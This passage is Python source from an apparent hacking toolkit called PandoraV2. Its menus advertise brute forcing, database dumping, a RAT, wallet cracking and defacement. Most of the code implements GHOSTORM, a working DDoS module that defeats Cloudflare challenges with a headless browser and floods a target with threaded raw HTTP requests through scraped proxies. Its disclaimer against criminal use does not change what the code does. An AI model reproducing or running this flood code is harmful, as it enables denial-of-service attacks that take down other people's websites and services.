            os.makedirs('__system.file__/USER_')
            print("\033[1;34m[+]\033[0m Folder 'USER_' created successfully!")
        if not exists('public_html'):
            os.makedirs('public_html')
            print("\033[1;34m[+]\033[0m Folder 'public_html' created successfully!")
        time.sleep(2)
        if not exists('__system.file__/USER_/user.log'):
            with open('__system.file__/USER_/user.log', 'a') as file:
                file.write(str('pandorav2')+'\r')
            print("\033[1;34m[+]\033[0m File 'user.log' created successfully!")
        if not exists('__system.file__/LOG_/default_color.log'):
            with open('__system.file__/LOG_/default_color.log', 'a') as file:
                file.write(str('is_default=444 | is_secondcolor=white | is_firstcolor=cyan')+'\r')
            print("\033[1;34m[+]\033[0m File 'default_color.log' created successfully!")
        if not exists('public_html/index.php'):
            with open('public_html/index.php', 'a') as file:
                file.write(str(indexphp)+'\r')
            print("\033[1;34m[+]\033[0m File 'index.php' created successfully!")
        else:
            with open('__system.file__/LOG_/dir.log', 'a') as file:
                file.write(str('verified')+'\r')
            pass

class color:
    def red():
        redz = '\033[1;91m'
        return redz
    def blue():
        bluez = '\033[1;34m'
        return bluez
    def green():
        greenz = '\033[1;32m'
        return greenz
    def yellow():
        yellowz = '\033[1;33m'
        return yellowz
    def white():
        whitez = '\033[0m'
        return whitez
    def gold():
        goldz = '\033[0;33m'
        return goldz
    def gray():
        grayz = '\033[1;30m'
        return grayz
    def cyan():
        cyanz= '\033[1;36m'
        return cyanz
    def dark_red():
        drk = '\033[0;31;40m'
        return drk
    def pink():
        pinkz = '\033[0;31;40m'
        return pinkz
    def adjust(): #1. [1.cyan 2.white] 2. [1.dark_red 2.white] 3. [1.gold 2.white]
        login.check_folder()
        with open('__system.file__/LOG_/default_color.log', 'r') as file:
            color_inner = file.readline().strip()

        second = '\033[0m'
        first = '\033[0m'

        if 'is_secondcolor=white' in color_inner:
            first = '\033[0m'
        if 'is_firstcolor=cyan' in color_inner:
            second = '\033[1;36m'
        elif 'is_firstcolor=dark_red' in color_inner:
            second = '\033[0;31;40m'
        elif 'is_firstcolor=gold' in color_inner:
            second = '\033[0;33m'
        elif 'is_firstcolor=green' in color_inner:
            second = '\033[0;32m'
        else:
            raise ValueError("No match color in path {}".format('__system.file__/LOG_/default_color.log'))

        colors = {
            'first': first,
            'second': second
        }
        return colors
indexphp = """
<!DOCTYPE html>
<html>
<head>
    <title>PHP Function Example</title>
</head>
<body>
    <?php
    // Definisikan fungsi PHP
    function greet($name) {
        return "Hello, $name!";
    }

    // Panggil fungsi dan tampilkan hasilnya
    $message = greet("World");
    echo "<h1>$message</h1>";
    ?>
</body>
</html>
"""

def clear():
    os.system('clear' if os.name == 'posix' else "cls")

yellow = '\033[1;33m'
green = '\033[1;32m'
gold = '\033[0;33m'
white = '\033[0m'
red = '\033[1;91m'
red_t = '\033[0;31;40m'

def prompt():
    try:
        username = open('__system.file__/USER_/user.log', 'r').readline().strip()
    except FileNotFoundError:
        raise ValueError('No user file detected!')
    PS1 = f"{colors['second']}┌({colors['first']}{username}{colors['second']}@{colors['first']}root {colors['second']}-{colors['first']} fsociety{colors['second']})-{colors['second']}[{colors['first']}~/{now_path}{colors['second']}]\n{colors['second']}┕━{colors['first']}>"
    prompt = input(PS1 + '')
    print('')
    return prompt

class banner: #help - menu, change color, changeconc, change hostname (pandora@root) become custom
    global colors
    colors = color.adjust()
    def logo():
        global now_path
        clear()
        now_path = "home"
        logo = f"""
        {colors['first']}_________ {colors['second']}                    .___                ____   ____________  
        {colors['first']}\\______  \ ___{colors['second']}__    ____    __| _/________________\   \ /   /\\_____  \ 
        |     ___/\\__   \  /    \  / __ |/  _ \\_  __ \\__  \\\\   Y   /  /  ____/ 
        |    |     / __  \|   |  \\/ /_/ (  <_> )  | \\// __ \\\\     /  /       \ 
        |____|    (____   /___|  /\\____ |\\____/|__|  (____  /\\___/   \\__{colors['first']}_____ \\
                        {colors['second']}\\/     \\/      \\/                 \\/                 {colors['first']}\\/
                                {colors['second']}Coded {colors['first']}By {colors['second']}: {color.red()}MrSanZz
                            {colors['first']}Team{colors['second']} : {color.red()}Ador4 | JogjaXploit
                            {colors['first']}https://github.com/MrSanZz
        """
        return logo

    def menu(): # CSRF
        global now_path
        clear()
        now_path = "menu1"
        menu = f"""
        {colors['first']}╔══════════{colors['second']}══════════════════════════════════════════════════════════════════════════════════════╗
        {colors['first']}║{colors['second']}                                    {colors['first']}Welcome To The PandoraV2{colors['second']}                                    ║
        ║                                     {colors['first']}PandoraV2 Menu 1 Page.{colors['second']}                                     ║
        ╚═══════════════════════════════════════════════════════════════════════════════════{colors['first']}═════════════╝

        {colors['first']}╔═══════════════════{colors['second']}════════════════════════════╦════════════════════════════════════════════════╗
        ║ {color.pink()}• {colors['second']}[{colors['first']}01{colors['second']}]{colors['first']}.{colors['second']} SQLITE                                ║ {color.pink()}• {colors['second']}[{colors['first']}11{colors['second']}]{colors['first']}.{colors['second']} Net Monitor                            ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}02{colors['second']}]{colors['first']}.{colors['second']} WPBF (BruteForce)                     ║ {color.pink()}• {colors['second']}[{colors['first']}12{colors['second']}]{colors['first']}.{colors['second']} Whois                                  ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}03{colors['second']}]{colors['first']}.{colors['second']} DB Dumper                             ║ {color.pink()}• {colors['second']}[{colors['first']}13{colors['second']}]{colors['first']}.{colors['second']} DB Dumper V2                           ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}04{colors['second']}]{colors['first']}.{colors['second']} Google Osint                          ║ {color.pink()}• {colors['second']}[{colors['first']}14{colors['second']}]{colors['first']}.{colors['second']} GHOSTORM (DDoS)                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}05{colors['second']}]{colors['first']}.{colors['second']} Admin Finder                          ║ {color.pink()}• {colors['second']}[{colors['first']}15{colors['second']}]{colors['first']}.{colors['second']} Query Crawler                          ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}06{colors['second']}]{colors['first']}.{colors['second']} Lite-Nmap                             ║ {color.pink()}• {colors['second']}[{colors['first']}16{colors['second']}]{colors['first']}.{colors['second']} L4dump                                 ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}07{colors['second']}]{colors['first']}.{colors['second']} Dorker                                ║ {color.pink()}• {colors['second']}[{colors['first']}17{colors['second']}]{colors['first']}.{colors['second']} Site-Seeker                            ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}08{colors['second']}]{colors['first']}.{colors['second']} X-Dorker (Special)                    ║ {color.pink()}• {colors['second']}[{colors['first']}18{colors['second']}]{colors['first']}.{colors['second']} Subdo-Finder                           ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}09{colors['second']}]{colors['first']}.{colors['second']} RAT (On Progress)                     ║ {color.pink()}• {colors['second']}[{colors['first']}19{colors['second']}]{colors['first']}.{colors['second']} Proxy-Logger                           ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}10{colors['second']}]{colors['first']}.{colors['second']} API GPT Cracker                       ║ {color.pink()}• {colors['second']}[{colors['first']}20{colors['second']}]{colors['first']}.{colors['second']} Deface html                            ║
        ╚═══════════════════════════════════════════════╩══════════════════════════════{colors['first']}══════════════════╝
        """
        return menu

    def menu2(): # CSRF
        global now_path
        clear()
        now_path = "menu2"
        menu = f"""
        {colors['first']}╔══════════{colors['second']}══════════════════════════════════════════════════════════════════════════════════════╗
        {colors['first']}║{colors['second']}                                    {colors['first']}Welcome To The PandoraV2{colors['second']}                                    ║
        ║                                     {colors['first']}PandoraV2 Menu 2 Page.{colors['second']}                                     ║
        ╚═══════════════════════════════════════════════════════════════════════════════════{colors['first']}═════════════╝

        {colors['first']}╔═══════════════════{colors['second']}════════════════════════════╦════════════════════════════════════════════════╗
        ║ {color.pink()}• {colors['second']}[{colors['first']}01{colors['second']}]{colors['first']}.{colors['second']} Subdo GIT                             ║ {color.pink()}• {colors['second']}[{colors['first']}11{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}02{colors['second']}]{colors['first']}.{colors['second']} BTC WALLET CRACKER                    ║ {color.pink()}• {colors['second']}[{colors['first']}12{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}03{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}13{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}04{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}14{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}05{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}15{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}06{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}16{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}07{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}17{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}08{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}18{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}09{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}19{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ║ {color.pink()}• {colors['second']}[{colors['first']}10{colors['second']}]{colors['first']}.{colors['second']}                                       ║ {color.pink()}• {colors['second']}[{colors['first']}20{colors['second']}]{colors['first']}.{colors['second']}                                        ║
        ╚═══════════════════════════════════════════════╩══════════════════════════════{colors['first']}══════════════════╝
        """
        return menu
    
    def help():
        global now_path
        clear()
        now_path = "help"
        help = f"""
        {colors['first']}╔══════════{colors['second']}══════════════════════════════════════════════════════════════════════════════════════╗
        {colors['first']}║{colors['second']}                                    {colors['first']}Welcome To The PandoraV2{colors['second']}                                    ║
        ║                                      {colors['first']}PandoraV2 Help Page.{colors['second']}                                      ║
        ╚═══════════════════════════════════════════════════════════════════════════════════{colors['first']}═════════════╝

        {colors['first']}╔═══════════════════{colors['second']}════════════════════════════╗       {colors['first']}PandoraV2{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} changeusername (To change username)       ║       {colors['first']}Tools created by MrSanZz{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} cls / clear (Refresh page)                ║       {colors['first']}date 20/06/2024{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} menu / menu2 (Menu page)                  ║{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} changeconc (Change concurrent)            ║       {colors['first']}READ THIS!!{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} changecolor (Change page color)           ║       {colors['first']}This tool is used only for clear purposes.{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} license                                   ║       {colors['first']}this tool is used as wisely as possible.{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']} bigthanks (our contributors)              ║       {colors['first']}it is not used for cyber crime activities.{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']}                                           ║       {colors['first']}the developer of this tool will not be responsible!.{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']}                                           ║       {colors['first']}if there are problems, contact: https://t.me/MrSanZzXe{colors['second']}
        ║ {color.pink()}• {colors['first']}.{colors['second']}                                           ║{colors['second']}
        ╚═══════════════════════════════════{colors['first']}════════════╝       Made by JogjaXploit-{colors['second']}
        """
        return help
###########################################################################################################################
def GHOSTORM():
    red = '\033[1;91m'
    white = '\033[0m'
    green = '\033[1;32m'
    yellow = '\033[1;33m'
    blue = '\033[1;34m'
    red_t = '\033[0;31;40m'
    gray = '\033[1;37;40m'
    gold = '\033[0;33m'
    purple = '\033[0;33m'
    def clear():
        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
    def repage():
        os.system('exit')
        os.system('python3 2c2.py')
    class color:
        def white():
            white = '\033[0m'
            return white
        def gold():
            gold = '\033[0;33m'
            return gold
        def yellow():
            yellow = '\033[1;33m'
            return yellow
        def red():
            red = '\033[1;91m'
            return red
        def green():
            green = '\033[1;32m'
            return green
        def purple():
            purple = '\033[1;35m'
            return purple
        def blue():
            blue = '\033[1;34m'
            return blue
    def target(url):
        url=url.rstrip()
        target={}
        target['uri'] = urlparse(url).path
        if target['uri'] == "":
            target['uri'] == "/"
        target['host'] = urlparse(url).netloc
        target['scheme'] = urlparse(url).scheme
        if ":" in urlparse(url).netloc:
            target['port'] = urlparse(url).netloc.split(":")[1]
        else:
            target['port'] = "443" if urlparse(url).scheme == "https" else "80"
            pass
        return target
    #Big Project2
    #countdown from KarmaDDOS
    class Main():
        def formatConsoleDate( date ):
            return '[' + date.strftime('%Y-%m-%d-%H:%M:%S') + ']'
            pass

        def GetArgs():
            return sys.argv;
            pass

        def GetChromeVersion( useragent ):
            return useragent.split("Chrome/")[1].split(".0.")[0]
            pass
    def get_cookie(url):
        global useragent, cookieJAR, cookie
        options = webdriver.ChromeOptions()
        arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
        ]
        for argument in arguments:
            options.add_argument(argument)
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(3)
        driver.get(url)
        for _ in range(60):
            cookies = driver.get_cookies()
            tryy = 0
            for i in cookies:
                if i['name'] == 'cf_clearance':
                    cookieJAR = driver.get_cookies()[tryy]
                    useragent = driver.execute_script("return navigator.userAgent")
                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                    driver.quit()
                    return True
                else:
                    tryy += 1
                    pass
            time.sleep(1)
        driver.quit()
        return False
    class Target:
        def Bypass(url, proxy, hash_digest ):
                global config
                options = webdriver.ChromeOptions()
                options.add_argument("--disable-infobars")
                options.add_argument("--disable-logging")
                options.add_argument('--proxy-server=%s' % proxy)
                options.add_argument("--disable-login-animations")
                options.add_argument("--disable-notifications")
                options.add_argument("--disable-default-apps")
                options.add_argument("--disable-popup-blocking")
                options.add_argument("--load-extension={}".format('resources\\logs\\hcaptcha'))
                driver = webdriver.Chrome(options=options)

                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                    stylize(f" New worker started", colored.fg('green')))

                driver.get('https://google.com/')
                driver.execute_script(f"window.open('{Main.GetArgs()[1]}')")
                driver.switch_to.window(driver.window_handles[1])

                BypassEvent = True
                while BypassEvent:
                    time.sleep(6)

                    if driver.title != 'Attention Required! | Cloudflare':
                        BypassEvent = False

                        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                            stylize(f" Challenge bypassed successfully.", colored.fg('green')))

                        config['threads'][hash_digest] = True

                        cookieJar = driver.get_cookies()[0] if len(driver.get_cookies()) != 0 else False
                        useragent = driver.execute_script("return navigator.userAgent")

                        driver.quit()

                        ThreadEvent = True
                        while ThreadEvent:
                            time.sleep(1)

                            if all(value == True for value in config['threads'].values()):
                                ThreadEvent = False

                                proxy = {
                                    'http': f'http://{proxy}',
                                    'https': f'http://{proxy}'
                                }

                                if cookieJar != False:
                                    cookie = f"{cookieJar['name']}={cookieJar['value']}"
                                else:
                                    cookie = False
                                    pass

                                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                                    stylize(f" Starting workers ...", colored.fg('green')))
                                for _ in range(50):
                                    threading.Thread(target=Target.Start, args=[url, cookie, useragent, proxy]).start()
                                    pass
                                pass
                            pass
                        else:
                            driver.execute_script(f"window.open('{Main.GetArgs()[1]}')")
                            driver.switch_to.window(driver.window_handles[1])
                            pass
                        pass
                    pass
                pass
        def Start(url, cookie, useragent, proxy):
            global config

            proxy = urlparse(proxy['https']).netloc.split(":")

            target = {}
            target['uri'] = urlparse(url).path
            target['host'] = urlparse(url).netloc
            target['scheme'] = urlparse(url).scheme
            if ":" in urlparse(url).netloc:
                target['port'] = urlparse(url).netloc.split(":")[1]
            else:
                target['port'] = "443" if urlparse(url).scheme == "https" else "80"
                pass

            network = {}
            network['raw'] =  'GET ' + target['uri'] + ' HTTP/2.0\r\n'
            network['raw'] += 'Host: ' + target['host'] + '\r\n'
            network['raw'] += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
            network['raw'] += 'Accept-Encoding: gzip, deflate, br\r\n'
            network['raw'] += 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
            network['raw'] += 'Cache-Control: max-age=0\r\n'
            if cookie != False:
                network['raw'] += 'Cookie: ' + cookie + '\r\n'
            network['raw'] += f'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\n'
            network['raw'] += 'sec-ch-ua-mobile: ?0\r\n'
            network['raw'] += 'sec-ch-ua-platform: "Windows"\r\n'
            network['raw'] += 'sec-fetch-dest: empty\r\n'
            network['raw'] += 'sec-fetch-mode: cors\r\n'
            network['raw'] += 'sec-fetch-site: same-origin\r\n'
            network['raw'] += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'

            if target['scheme'] == 'https':
                while True:
                    try:
                        packet = socks.socksocket()
                        packet.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        packet.connect((str(target['host']), int(target['port'])))

                        packet = ssl.SSLContext().wrap_socket(packet, server_hostname=target['host'])
                        try:
                            for _ in range(10):
                                packet.send(str.encode(network['raw']))
                                pass
                        except:
                            packet.close()
                            pass
                    except:
                        pass
                pass
            else:
                while True:
                    try:
                        packet = socks.socksocket()
                        packet.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        packet.connect((str(target['host']), int(target['port'])))

                        try:
                            for _ in range(10):
                                packet.send(str.encode(network['raw']))
                                pass
                        except:
                            packet.close()
                            pass
                    except:
                        pass
                    pass
    class proxied:
        def layer7_target():
            url = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"URL             "+'\033[0;33m'+': '+'\033[0m')
            threadsi = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"THRD            "+'\033[0;33m'+': '+'\033[0m')
            t = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"TIME            "+'\033[0;33m'+': '+'\033[0m')
            proxy = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PROXY           "+'\033[0;33m'+': '+'\033[0m')
            return url, threadsi, t, proxy
    class prompt:
        def onlyurl():
            url = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"URL             "+'\033[0;33m'+': '+'\033[0m')
            return url
        def layer7_target():
            url = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"URL             "+'\033[0;33m'+': '+'\033[0m')
            threadsi = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"THRD            "+'\033[0;33m'+': '+'\033[0m')
            t = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"TIME            "+'\033[0;33m'+': '+'\033[0m')
            return url, threadsi, t
        def C2_region():
            url = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"URL             "+'\033[0;33m'+': '+'\033[0m')
            threadsi = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"THRD            "+'\033[0;33m'+': '+'\033[0m')
            t = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"TIME            "+'\033[0;33m'+': '+'\033[0m')
            ip = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"IP              "+'\033[0;33m'+': '+'\033[0m')
            port = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PORT            "+'\033[0;33m'+': '+'\033[0m')
            return url, threadsi, t, ip , port
        def layer4_target():
            ip = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"IP              "+'\033[0;33m'+': '+'\033[0m')
            port = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PORT            "+'\033[0;33m'+': '+'\033[0m')
            threadsi = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"THRD            "+'\033[0;33m'+': '+'\033[0m')
            t = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"TIME            "+'\033[0;33m'+': '+'\033[0m')
            return ip, port, threadsi, t
    class headdata:
        def mix(url):
            headers = {
                "User-Agent": UserAgent().chrome,
                "Host": str(url),
                "X-Forwaded-For": "114.831.26.0",
                "Via": "114.831.26.0",
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Range": "bytes=0-8192",
                'X-Forwarded-For': '127.0.0.1',
                'X-Forwarded-For': 'localhost',
                'X-Forwarded-For': '192.168.1.1',
                "Content-Length": "8192",
                'Content-Type': 'application/octet-stream'
            }
            return headers
        def datamix():
            data = {
                'X': 'X'*16384,
                'Y': 'Y'*8192,
                'Z': 'Z'*4096
            }
            return data
    class type:
        def typing(text):
            def typing_animation(text, typing_speed=0.1, deleting_speed=0.05, pause=0.5):
                try:
                    for char in text:
                        sys.stdout.write(char)
                        sys.stdout.flush()
                        time.sleep(typing_speed)

                    time.sleep(pause)

                    for char in text:
                        sys.stdout.write('\b \b')
                        sys.stdout.flush()
                        time.sleep(deleting_speed)

                except KeyboardInterrupt:
                    sys.stdout.write('\n')
                    sys.stdout.flush()

            if __name__ == '__main__':
                typing_animation(text)

    class info:
        class login:
            def create_folders():
                if not os.path.exists('resources'):
                    os.makedirs('resources')
                    print("Folder 'resources' created successfully.")
                if not os.path.exists('resources/logs'):
                    os.makedirs('resources/logs')
                    print("Folder 'logs' created successfully.")
                if not os.path.exists('resources/main_'):
                    os.makedirs('resources/main_')
                    print("Folder 'main_' created successfully.")
                time.sleep(3)
            def start():
                try:
                    if not exists("resources/main_/username.txt"):
                        user = input(Fore.LIGHTRED_EX+"[!]"+Fore.WHITE+" Your username : ")
                        loc = 'resources/main_/username.txt'
                        with open(loc, "w") as file:
                            file.write(str(user))
                    elif exists("resources/main_/username.txt"):
                        pass
                    if not os.path.exists('resources'):
                        os.makedirs('resources')
                        print("Folder 'resources' created successfully.")
                    if not os.path.exists('resources/logs'):
                        os.makedirs('resources/logs')
                        print("Folder 'logs' created successfully.")
                    if not os.path.exists('resources/main_'):
                        os.makedirs('resources/main_')
                        print("Folder 'main_' created successfully.")
                    elif exists('resources'):
                        pass
                except:
                    pass
            def username():
                try:
                    loc = 'resources/main_/username.txt'
                    with open(loc, 'r') as file:
                        api = file.readline()
                    apiz = api.strip()
                    return apiz
                except:
                    pass
            def is_vip():
                try:
                    def save(saved):
                        loc = 'resources/main_/vip.log'
                        with open(loc, "w") as file:
                            file.write(str(saved))
                    if not exists("resources/main_/vip.log"):
                        saved = "YES"
                        save(saved)
                        print("Congratulations!, You are now VIP!")
                    elif exists("resources/main_/vip.log"):
                        pass
                except:
                    pass
            def vip():
                try:
                    loc = 'resources/main_/vip.log'
                    with open(loc, 'r') as file:
                        api = file.readline()
                    apiz = api.strip().replace("b'", '\r')
                    con = apiz.replace("'", '')
                    vip = con
                    return vip
                except:
                    pass
            def is_owner():
                try:
                    def save(saved):
                        loc = 'resources/main_/owner.log'
                        with open(loc, "w") as file:
                            file.write(str(saved))
                    if not exists("resources/main_/owner.log"):
                        saved = "YES"
                        save(saved)
                    elif exists("resources/main_/owner.log"):
                        pass
                except:
                    pass
            def owner():
                try:
                    loc = 'resources/main_/owner.log'
                    with open(loc, 'r') as file:
                        api = file.readline()
                    apiz = api.strip().replace("b'", '\r')
                    con = apiz.replace("'", '')
                    owner = con
                    return owner
                except:
                    pass
        class get_product:
            def id():
                if not exists("resources/id.txt"):
                    id = ''.join(random.choices('0123456789', k=12))
                    loc='resources/id.txt'
                    with open(loc, 'w') as file:
                        file.write(id)
                else:
                    loc='resources/id.txt'
                    with open(loc, 'r') as file:
                        file = file.readline()
                    id = file.strip()
                    return id
        class ip:
            def hostname():
                host = socket.gethostname()
                return host
            def ipaddr():
                ip = socket.gethostbyname(socket.gethostname())
                return ip
        class concurrent:
            def concurrent():
                if not exists('resources/logs/conc.log'):
                    user = input(Fore.LIGHTRED_EX+"[!]"+Fore.WHITE+" Concurrent [1-6] : ")
                    if user == "":
                        print(Fore.RED + "Error: please fill!")
                    elif not user.isdigit() or int(user) > 6:
                        print(Fore.RED + "Error: max is 6 concurrent!")
                        exit()
                    with open('resources/logs/conc.log', 'w') as file:
                        conc = file.write(str(user)+'\r')
                else:
                    with open('resources/logs/conc.log', 'r') as file:
                        conc = file.readline()
                    return conc
            def change():
                if main.main().lower() == 'changeconc':
                    user = input(Fore.LIGHTRED_EX+"[!]"+Fore.WHITE+" Concurrent [1-6] : ")
                    if not user:
                        print(Fore.RED + "Error: please fill!")
                    elif not user.isdigit() or int(user) > 6:
                        print(Fore.RED + "Error: max is 6 concurrent!")
                    else:
                        with open('resources/logs/conc.log', 'w') as file:
                            file.write(str(user)+'\r')
                else:
                    pass
        class method:
            def vip():
                if exists('resources/main_/vip.log'):
                    loc = 'resources/main_/vip.log'
                    with open(loc, 'r') as file:
                        vip = file.readline()
                    file = vip.strip()
                    if file == 'YES':
                        special = 'BUMB[1], PXBUMB[1], ICBM[1], PXICBM[1], NUKE[1], MYDOOM[1][HOLD METHOD]'
                        return special
                    else:
                        return None
                else:
                    return None
            def secret():
                if exists('resources/main_/owner.log'):
                    loc = 'resources/main_/owner.log'
                    with open(loc, 'r') as file:
                        secrets = file.readline()
                    file = secrets.strip()
                    if file == 'YES':
                        secret = 'MIXSanZz[1], Anya[1], PXAnya[1], AnyaV2[1], PXAnyaV2[1], Ahegao[1], PXAhegao[1]'
                        return secret
                    else:
                        return None
                else:
                    return None
        class afterburn:
            def starting(username, t, threads, vip, owner, url, method):
                headers = {"User-Agent": random.choice(user_agents)}
                try:
                    response = requests.get(url, headers=headers, timeout=7)
                except TimeoutError:
                    pass
                after = "┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                after += "┃ SENT BY  ┃       : {}\n".format(username)
                after += "┃ URL      ┃       : {}\n".format(url)
                after += "┃ THREADS  ┃       : {}\n".format(threads)
                after += "┃ TIME     ┃       : {}\n".format(t)
                after += "┃ VIP      ┃       : {}\n".format(vip)
                after += "┃ Owner    ┃       : {}\n".format(owner)
                after += "┃ METHOD   ┃       : {}\n".format(method)
                after += "┃ API      ┃       : None\n"
                after += "┣━━━INFO━━━┫                 \n"
                after += "┃ CF-RAY   ┃       : {}\n".format(response.headers.get("CF-Ray"))
                after += "┃ Server   ┃       : {}\n".format(response.headers.get("Server"))
                after += "┃ Cookie   ┃       : {}\n".format(response.headers.get("Cookie"))
                after += "┃ R Code   ┃       : {}\n".format(response.status_code)
                after += "┗━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                return after
            def botneted(username, t, threads, vip, owner, url, method, rezponz):
                headers = {"User-Agent": random.choice(user_agents)}
                try:
                    response = requests.get(url, headers=headers, timeout=7)
                except TimeoutError:
                    pass
                after = "┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                after += "┃ SENT BY  ┃       : {}\n".format(username)
                after += "┃ URL      ┃       : {}\n".format(url)
                after += "┃ THREADS  ┃       : {}\n".format(threads)
                after += "┃ TIME     ┃       : {}\n".format(t)
                after += "┃ VIP      ┃       : {}\n".format(vip)
                after += "┃ Owner    ┃       : {}\n".format(owner)
                after += "┃ METHOD   ┃       : {}\n".format(method)
                after += "┃ API      ┃       : {}\n".format(rezponz)
                after += "┣━━━INFO━━━┫                 \n"
                after += "┃ CF-RAY   ┃       : {}\n".format(response.headers.get("CF-Ray"))
                after += "┃ Server   ┃       : {}\n".format(response.headers.get("Server"))
                after += "┃ Cookie   ┃       : {}\n".format(response.headers.get("Cookie"))
                after += "┃ R Code   ┃       : {}\n".format(response.status_code)
                after += "┗━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                return after
        def getproxy():
            type = input('SOCKS5/HTTP : ').lower()
            path = 'resources/logs/{}.txt'.format(type)
            if type == "socks5":
                if not os.path.exists(path):
                    r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
                    r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
                    open(path, 'w').write(r)
                    r = r.rstrip().split('\r\n')
